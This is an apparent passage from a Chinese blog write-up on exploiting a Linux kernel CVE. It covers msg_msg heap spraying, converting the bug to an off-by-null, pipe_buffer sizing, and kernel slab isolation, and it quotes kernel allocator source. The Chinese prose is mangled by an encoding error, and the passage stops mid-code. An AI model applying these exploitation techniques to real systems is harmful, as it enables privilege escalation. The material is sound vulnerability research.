<p>é¦–å…ˆï¼Œåœ¨å¼€å§‹<code>size = 4095</code>æ—¶å³ä¾¿æ˜¯ä¼ å…¥çš„<code>key</code>ä¸º<code>\x00</code>æ—¶ä¹Ÿä¼šåœ¨ä¸‹ä¸€ä¸ª<code>object</code>ä¸­å†™å…¥ä¸€ä¸ª<code>&quot;=&quot;</code>ï¼Œæ‰€ä»¥ä¸å¹¸çš„æ˜¯ä¸èƒ½ç›´æ¥ä¿®æ”¹ä¸‹ä¸€ä¸ªç´§é‚»çš„<code>pipe_buffer-&gt;page</code>ã€‚å‰é¢ä¹Ÿæåˆ°äº†è¿™é‡Œé€‰æ‹©çš„æ–¹å¼ä¿®æ”¹ä¸‹ä¸€ä¸ª<code>object</code>ç´§é‚»çš„ä¸‹ä¸€ä¸ª<code>object</code>ï¼Œä¸è¿‡æˆ‘ä»¬å¦‚æœå•çº¯ä½¿ç”¨<code>pipe_buffer</code>è¿›è¡Œå †å–·æ—¶ä¼šå‡ºç°ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨åç»­å¯»æ‰¾è¢«è¦†ç›–<code>page</code>æŒ‡é’ˆçš„<code>pipe_buffer</code>çš„<code>idx</code>æ—¶ä¼šå‡ºç°ä¸€ä¸ªå¤§é—®é¢˜ï¼Œé‚£å°±æ˜¯å› ä¸ºå‰é¢ä¿®æ”¹å¯¼è‡´è¯»å–<code>pipe</code>æ—¶å¯¼è‡´<code>kernel panic</code>ã€‚æ‰€ä»¥a3é€‰æ‹©çš„åŠæ³•æ˜¯ä½¿ç”¨<code>msg_msg</code>è¿›è¡Œå¤§é‡å †å–·ï¼Œé€šè¿‡ä¿®æ”¹<code>m_ts</code>æ¥åˆ¤æ–­å“ªä¸ª<code>msg_msg</code>æ˜¯è¢«è¦†ç›–æ‰äº†ï¼Œä¹‹åè¿™ä¸ª<code>msg_msg</code>å°±ä¸å†ä½¿ç”¨é˜²æ­¢å‡ºç°<code>kernel panic</code>ï¼Œé‚£æ­¤æ—¶ä¹Ÿå°±æˆåŠŸå°†æ¼æ´è½¬åŒ–æˆäº†<code>off by null</code>äº†ï¼Œåç»­çš„ä½¿ç”¨å…¶å®å°±å’Œä¸Šé¢çš„æ–‡ç« ä¸­ä¸€è‡´äº†ï¼Œä¸ç†Ÿæ‚‰çš„æœ‹å‹å¯ä»¥å»çœ‹çœ‹ã€‚</p>
<p>å½“ç„¶è¿™é‡Œè¿˜éœ€è¦è€ƒè™‘çš„å°±æ˜¯<code>order</code>äº†ï¼Œæ­¤å¤„ç”³è¯·çš„<code>object</code>å¯¹åº”çš„<code>order</code>ä¸º3ã€‚å½“ç„¶ï¼Œå„ä½çŸ¥é“çŸ¥é“çš„<code>pipe</code>æä¾›<code>fcntl(F_SETPIPE_SZ)</code>è°ƒç”¨å¯ä»¥å»ä¿®æ”¹<code>pipe_buffer</code>çš„æ•°é‡ï¼Œæ‰€ä»¥å¯ä»¥è¾¾åˆ°å¯¹åº”çš„<code>order</code>å½“ç„¶<code>msg_msg</code>åŒç†ã€‚</p>
<h3 id="å†…éƒ¨éš”ç¦»åˆ†æ"><a href="#å†…éƒ¨éš”ç¦»åˆ†æ" class="headerlink" title="å†…éƒ¨éš”ç¦»åˆ†æ"></a>å†…éƒ¨éš”ç¦»åˆ†æ</h3><p>åœ¨çœ‹å®Œç¬¬ä¸€ç§åˆ©ç”¨æ–¹å¼çš„æœ‹å‹ä»¬å¯èƒ½ä¼šæœ‰ç‚¹ç–‘æƒ‘ï¼Œâ€ä¸ºä»€ä¹ˆå¯ä»¥ä½¿ç”¨<code>msg_msg</code>ï¼Ÿâ€ã€‚åœ¨ctf-wikiä¸­å†™äº†â€åœ¨linux kernel 5.9ä¹‹å‰å’Œlinux kernel 5.11ä¹‹åéƒ½æ˜¯å­˜åœ¨å †å—éš”ç¦»çš„â€ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">kmalloc_cache_type</span> &#123;</span></span><br><span class="line">	KMALLOC_NORMAL = <span class="number">0</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_ZONE_DMA</span></span><br><span class="line">	KMALLOC_DMA = KMALLOC_NORMAL,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_MEMCG_KMEM</span></span><br><span class="line">	KMALLOC_CGROUP = KMALLOC_NORMAL,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	KMALLOC_CGROUP,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	KMALLOC_RECLAIM,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_ZONE_DMA</span></span><br><span class="line">	KMALLOC_DMA,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	NR_KMALLOC_TYPES</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>åœ¨kernel 5.14ä¹‹åå­˜åœ¨å¦‚ä¸Šçš„<code>cache type</code>ï¼Œå…¶ä¸­å¸¸è¢«è®¤ä¸ºéš”ç¦»çš„æ˜¯<code>KMALLOC_CGROUPT</code>å…¶å¯¹åº”çš„æ˜¯flagä¸º<code>GFP_KERNEL_ACCOUNT</code>çš„ç”³è¯·ï¼Œå¯ä»¥åœ¨<code>slabinfo</code>æ–‡ä»¶ä¸­çœ‹åˆ°å…¶cacheçš„åå­—ä¸º<code>kmalloc-cg-*</code>ã€‚è€Œ<code>GFP_KERNEL</code>åˆ™å¯¹åº”çš„å°±æ˜¯<code>KMALLOC_NORMAL</code>ç±»å‹ï¼Œåœ¨<code>slabinfo</code>ä¸­å°±æ˜¯æ™®é€šçš„<code>kmalloc-*</code>ã€‚</p>
<p><strong>ä¸‹é¢ç®€å•ä»‹ç»ä¸€ä¸‹å†…å­˜éš”ç¦»çš„åŸç†ï¼š</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *<span class="title">kmalloc</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (__builtin_constant_p(size)) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_SLOB</span></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> index;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">		<span class="keyword">if</span> (size &gt; KMALLOC_MAX_CACHE_SIZE)</span><br><span class="line">			<span class="keyword">return</span> kmalloc_large(size, flags);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_SLOB</span></span><br><span class="line">		index = kmalloc_index(size);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!index)</span><br><span class="line">			<span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> kmem_cache_alloc_trace(</span><br><span class="line">				kmalloc_caches[kmalloc_type(flags)][index],</span><br><span class="line">				flags, size);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> __kmalloc(size, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨å†…æ ¸<code>kmalloc</code>çš„å®ç°é‡Œé¢å¯ä»¥çœ‹åˆ°çš„æ˜¯ï¼Œä¼šç»™<code>kmem_cache_alloc_trace</code>ä¼ å…¥ä¸€ä¸ªcacheï¼Œå¦å¤–<code>kmalloc_caches</code>æ˜¯ä¸€ä¸ªäºŒé‡æ•°ç»„ï¼Œé¦–å…ˆæ˜¯æ ¹æ®å¯¹åº”çš„<code>type</code>ç„¶åæ ¹æ®<code>size</code>ç¡®å®šä¸åŒçš„<code>index</code>å–å‡ºæœ€ç»ˆçš„<code>cache</code>ã€‚</p>
<p>è¿™é‡Œé‡ç‚¹çœ‹ä¸€ä¸‹<code>kmalloc_type</code>å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC_NOT_NORMAL_BITS					\</span></span><br><span class="line"><span class="meta">	(__GFP_RECLAIMABLE |					\</span></span><br><span class="line"><span class="meta">	(IS_ENABLED(CONFIG_ZONE_DMA)   ? __GFP_DMA : 0) |	\</span></span><br><span class="line"><span class="meta">	(IS_ENABLED(CONFIG_MEMCG_KMEM) ? __GFP_ACCOUNT : 0))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">enum</span> kmalloc_cache_type <span class="title">kmalloc_type</span><span class="params">(<span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The most common case is KMALLOC_NORMAL, so test for it</span></span><br><span class="line"><span class="comment">	 * with a single branch for all the relevant flags.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (likely((flags &amp; KMALLOC_NOT_NORMAL_BITS) == <span class="number">0</span>))</span><br><span class="line">		<span class="keyword">return</span> KMALLOC_NORMAL;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * At least one of the flags has to be set. Their priorities in</span></span><br><span class="line"><span class="comment">	 * decreasing order are:</span></span><br><span class="line"><span class="comment">	 *  1) __GFP_DMA</span></span><br><span class="line"><span class="comment">	 *  2) __GFP_RECLAIMABLE</span></span><br><span class="line"><span class="comment">	 *  3) __GFP_ACCOUNT</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (IS_ENABLED(CONFIG_ZONE_DMA) &amp;&amp; (flags &amp; __GFP_DMA))</span><br><span class="line">		<span class="keyword">return</span> KMALLOC_DMA;</span><br><span class="line">	<span class="keyword">if</span> (!IS_ENABLED(CONFIG_MEMCG_KMEM) || (flags &amp; __GFP_RECLAIMABLE))</span><br><span class="line">		<span class="keyword">return</span> KMALLOC_RECLAIM;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> KMALLOC_CGROUP;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¸»è¦çœ‹ä¸€ä¸‹<code>KMALLOC_NOT_NORMAL_BITS</code>çš„å®šä¹‰ï¼Œå› ä¸ºkernelé»˜è®¤å­˜åœ¨<code>CONFIG_MEMCG_KMEM</code>é€‰é¡¹æ‰€ä»¥æ·»åŠ äº†<code>__GFP_ACCOUNT</code>æ ‡è¯†ä¸ºï¼Œä»¥è‡³äºflagä¸º<code>GFP_KERNEL_ACCOUNT</code>æ—¶ä¸ä¼šç›´æ¥è¿”å›<code>KMALLOC_NORMAL</code>äº†ï¼Œè¿™ä¹Ÿå°±å¯¼è‡´äº†å †å—éš”ç¦»ã€‚</p>
<p>æ ¹æ®ä¸Šé¢çš„åˆ†æä¼šå‘ç°åœ¨<code>linux kernel 5.9</code>ä¹‹å‰ç¡®å®æ²¡æœ‰<code>KMALLOC_CGROUP</code>è¿™æ ·ä¸€ä¸ªæ–°å»ºçš„<code>kmem_cache</code>ï¼Œä¸è¿‡å…¶å®åœ¨æ­¤ä¹‹å‰ä¾æ—§æ˜¯å­˜åœ¨éš”ç¦»çš„ï¼Œè¿™é‡Œåˆ†æä¸€ä¸‹åœ¨<code>linux kernel 5.9</code>ä¹‹å‰çš„éš”ç¦»å®ç°åŸç†ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> *<span class="title">cpu_slab</span>;</span></span><br><span class="line">	<span class="comment">/* Used for retrieving partial slabs, etc. */</span></span><br><span class="line">	<span class="keyword">slab_flags_t</span> flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> min_partial;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> size;	<span class="comment">/* The size of an object including metadata */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> object_size;<span class="comment">/* The size of an object without metadata */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> offset;	<span class="comment">/* Free pointer offset */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">	<span class="comment">/* Number of per cpu partial objects to keep around */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> cpu_partial;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Allocation and freeing of slabs */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">max</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">min</span>;</span></span><br><span class="line">	<span class="keyword">gfp_t</span> allocflags;	<span class="comment">/* gfp flags to use on each alloc */</span></span><br><span class="line">	<span class="keyword">int</span> refcount;		<span class="comment">/* Refcount for slab cache destroy */</span></span><br><span class="line">	<span class="keyword">void</span> (*ctor)(<span class="keyword">void</span> *);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> inuse;		<span class="comment">/* Offset to metadata */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> align;		<span class="comment">/* Alignment */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> red_left_pad;	<span class="comment">/* Left redzone padding size */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *name;	<span class="comment">/* Name (only for display!) */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span>	<span class="comment">/* List of slab caches */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span>	<span class="comment">/* For sysfs */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">kobj_remove_work</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">memcg_cache_params</span> <span class="title">memcg_params</span>;</span></span><br><span class="line">	<span class="comment">/* For propagation, maximum size of a stored attr */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> max_attr_size;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kset</span> *<span class="title">memcg_kset</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> random;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Defragmentation by allocating from a remote node.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> remote_node_defrag_ratio;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> *random_seq;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KASAN</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kasan_cache</span> <span class="title">kasan_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> useroffset;	<span class="comment">/* Usercopy region offset */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> usersize;		<span class="comment">/* Usercopy region size */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>åœ¨ä¹‹å‰çš„<code>kmem_cache</code>ç»“æ„ä½“çš„å®šä¹‰å¦‚ä¸Šï¼Œå¯ä»¥çœ‹åˆ°çš„æ˜¯å†…éƒ¨ä¼šæ ¹æ®æ˜¯å¦å¼€å¯äº†<code>MEMCG</code>è¿™ä¸ªé€‰é¡¹æ¥æ·»åŠ <code>struct memcg_cache_params memcg_params;</code>è¿™æ ·ä¸€ä¸ªé¢å¤–çš„ç»“æ„ä½“ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">memcg_cache_params</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">root_cache</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">memcg_cache_array</span> __<span class="title">rcu</span> *<span class="title">memcg_caches</span>;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> __<span class="title">root_caches_node</span>;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">children</span>;</span></span><br><span class="line">			<span class="keyword">bool</span> dying;</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *<span class="title">memcg</span>;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">children_node</span>;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">kmem_caches_node</span>;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">percpu_ref</span> <span class="title">refcnt</span>;</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">void</span> (*work_fn)(struct kmem_cache *);</span><br><span class="line">			<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">				<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span></span><br><span class="line">				<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°çš„æ˜¯é¦–å…ˆä¼šå­˜æ”¾ä¸€ä¸ªæ ¹slabçš„æŒ‡é’ˆï¼Œåœ¨<code>memcg_caches</code>è¿™é‡Œå­˜æ”¾è‹¥å¹²ä¸ªå­<code>memcg slab</code>ç®¡ç†ç»“æ„ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">memcg_cache_array</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">entries</span>[0];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯è¯´å…¶å¯ä»¥é€šè¿‡æ ¹slabå’Œå­slabäº’ç›¸å¯»æ‰¾ã€‚åœ¨ä¸Šé¢è¿™é‡Œç»“æ„ä½“çš„å®šä¹‰ä¸­<code>entries</code>å°±æ˜¯ç”¨äºå­˜æ”¾<code>memcg slab</code>çš„æ•°ç»„ã€‚æ‰€ä»¥å¯ä»¥ç†è§£ä¸ºæ¯ä¸€ä¸ªæ ¹slabç®¡ç†ç»“æ„(æ ¹slabç®¡ç†ç»“æ„æ ¹æ®å¤§å°åˆ†ç±»)éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„å­memcg slabåˆ—è¡¨ã€‚</p>
<p>ä¸Šé¢å¤šä¸ºç†è®ºä¸­çš„å†…å®¹ï¼Œä¸‹é¢è®¨è®ºä¸€ä¸‹åœ¨å®é™…é¢å¯¹æ—¶æ‰€é‡åˆ°çš„é—®é¢˜ï¼š</p>
<p>åœ¨è¿™ä¸ªCVEä¸­ï¼Œæ‰€ä½¿ç”¨çš„æ‰€æœ‰åˆ†é…å¯¹è±¡çš„å‡½æ•°éƒ½ä¸º<code>kmalloc</code>é‚£ä¹ˆè¿™é‡Œå…ˆä»è¿™é‡Œçœ‹èµ·</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *<span class="title">kmalloc</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (__builtin_constant_p(size)) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_SLOB</span></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> index;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">		<span class="keyword">if</span> (size &gt; KMALLOC_MAX_CACHE_SIZE)</span><br><span class="line">			<span class="keyword">return</span> kmalloc_large(size, flags);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_SLOB</span></span><br><span class="line">		index = kmalloc_index(size);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!index)</span><br><span class="line">			<span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> kmem_cache_alloc_trace(</span><br><span class="line">				kmalloc_caches[kmalloc_type(flags)][index],</span><br><span class="line">				flags, size);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> __kmalloc(size, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ä¸Šé¢åœ¨åˆ†ä¸ºäº†ä¸¤æ¡åˆ†æ”¯ï¼Œæ ¹æ®çš„æ˜¯sizeæ˜¯å¦ä¸ºå®šé‡ï¼Œé‚£ä¹ˆæ ¹æ®è¿™ä¸ªcveæ­£å¥½ä¼šåˆ†åˆ«è¿›å…¥ä¸Šé¢çš„ä¸¤æ¡åˆ†æ”¯ä¸­ã€‚åœ¨åˆ†é…<code>msg_msg</code>æ—¶ä¼šè¿›å…¥åˆ°ä¸‹é¢çš„<code>__kmalloc</code>å‡½æ•°ä¸­ï¼Œåœ¨åˆ†é…<code>ctx-&gt;legacy_data</code>æ—¶åˆ™ä¼šè¿›å…¥åˆ°ä¸Šé¢çš„åˆ†æ”¯ä¸­ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *__kmalloc(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">s</span>;</span></span><br><span class="line">	<span class="keyword">void</span> *ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(size &gt; KMALLOC_MAX_CACHE_SIZE))</span><br><span class="line">		<span class="keyword">return</span> kmalloc_large(size, flags);</span><br><span class="line"></span><br><span class="line">	s = kmalloc_slab(size, flags);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(s)))</span><br><span class="line">		